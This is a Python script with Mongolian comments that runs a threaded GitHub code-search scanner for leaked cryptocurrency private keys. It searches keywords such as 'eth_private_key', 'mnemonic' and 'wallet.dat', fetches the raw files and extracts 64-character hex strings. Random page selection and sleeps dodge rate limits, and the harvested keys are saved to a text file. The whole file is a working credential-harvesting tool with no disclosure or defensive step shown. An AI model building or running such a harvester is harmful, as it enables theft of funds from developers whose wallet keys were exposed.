import os
import re
import time
import random
import requests
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed

GITHUB_SCANNER_RUNNING = False
# railway болон системээс environment variable-аар нь татаж авах ✅
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
if not GITHUB_TOKEN:
    print("⚠️ Анхааруулга: GITHUB_TOKEN орчин хувьсагч (environment variable) олдсонгүй!")

HEADERS = {
    "Authorization": f"Bearer {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json"
}

GITHUB_TXT_PATH = "/data/github.txt" if os.path.exists("/data") else "github.txt"

def process_single_file(item):
    file_url = item.get("html_url", "")
    repo_name = item.get("repository", {}).get("full_name", "")
    raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    try:
        file_res = requests.get(raw_url, headers=HEADERS, timeout=5)
        if file_res.status_code == 200:
            code_content = file_res.text
            crypto_keywords = ["private", "hex", "wallet", "crypto", "key", "secret", "mnemonic", "account"]
            if not any(sub in code_content.lower() for sub in crypto_keywords):
                return None
            matches = re.findall(r'\b[a-fA-F0-9]{64}\b', code_content)
            if matches:
                return [(match, repo_name, file_url) for match in matches]
    except Exception:
        pass
    return None

def save_github_tokens(tokens):
    existing = set()
    if os.path.exists(GITHUB_TXT_PATH):
        with open(GITHUB_TXT_PATH, "r", encoding="utf-8") as f:
            for line in f:
                existing.add(line.strip())
    new_count = 0
    with open(GITHUB_TXT_PATH, "a", encoding="utf-8") as f:
        for token in tokens:
            if token not in existing:
                f.write(f"{token}\n")
                new_count += 1
    print(f"✅ Saved {new_count} new Github 64-key tokens to {GITHUB_TXT_PATH}")

def run_github_search():
    global GITHUB_SCANNER_RUNNING
    keywords = [
        "secp256k1", "eth_private_key", "btc_private_key", "wallet_private",
        "ecdsa_private_key", "signing_key", "master_key", "private_key",
        "secret_key", "hex_key", "ethereum_private", "crypto_wallet",
        'mnemonic = "', "bip39", "hdwallet", "wif =", "wallet.dat",
        "keystore.json", "eth.accounts.privateKeyToAccount", "Account.from_key"
    ]
    url = "https://api.github.com/search/code"
    
    while GITHUB_SCANNER_RUNNING:
        found_tokens = set()
        for keyword in keywords:
            if not GITHUB_SCANNER_RUNNING:
                break
            for lang in ["python", "javascript", "env", "txt", "typescript", "json"]:
                if not GITHUB_SCANNER_RUNNING:
                    break
                query = f'{keyword} language:{lang}'
                available_pages = list(range(1, 21))
                selected_pages = sorted(random.sample(available_pages, 4))
                
                for page in selected_pages:
                    if not GITHUB_SCANNER_RUNNING:
                        break
                    params = {"q": query, "per_page": 100, "page": page}
                    try:
                        time.sleep(random.uniform(3.0, 5.0))
                        response = requests.get(url, headers=HEADERS, params=params, timeout=15)
                        if response.status_code == 200:
                            items = response.json().get("items", [])
                            if not items:
                                continue
                            with ThreadPoolExecutor(max_workers=25) as executor:
                                futures = {executor.submit(process_single_file, item): item for item in items}
                                for future in as_completed(futures):
                                    res = future.result()
                                    if res:
                                        for match, repo_name, file_url in res:
                                            found_tokens.add(match)
                        elif response.status_code == 403:
                            time.sleep(30)
                    except Exception as e:
                        print(f"Github search exception: {e}")
        if found_tokens:
            save_github_tokens(found_tokens)
        time.sleep(10)

def start_scanner():
    global GITHUB_SCANNER_RUNNING
    if not GITHUB_SCANNER_RUNNING:
        GITHUB_SCANNER_RUNNING = True
        Thread(target=run_github_search, daemon=True).start()
        return True, "🚀 GitHub 64-Key Scanner эхэллээ!"
    return False, "⚠️ GitHub Scanner аль хэдийн ажиллаж байна."

def stop_scanner():
    global GITHUB_SCANNER_RUNNING
    GITHUB_SCANNER_RUNNING = False
    return "🛑 GitHub 64-Key Scanner зогслоо."

def get_tokens_text():
    if os.path.exists(GITHUB_TXT_PATH):
        with open(GITHUB_TXT_PATH, "r", encoding="utf-8") as f:
            return f.read()
    return "Одоогоор ямар нэгэн GitHub 64-key олдсонгүй."
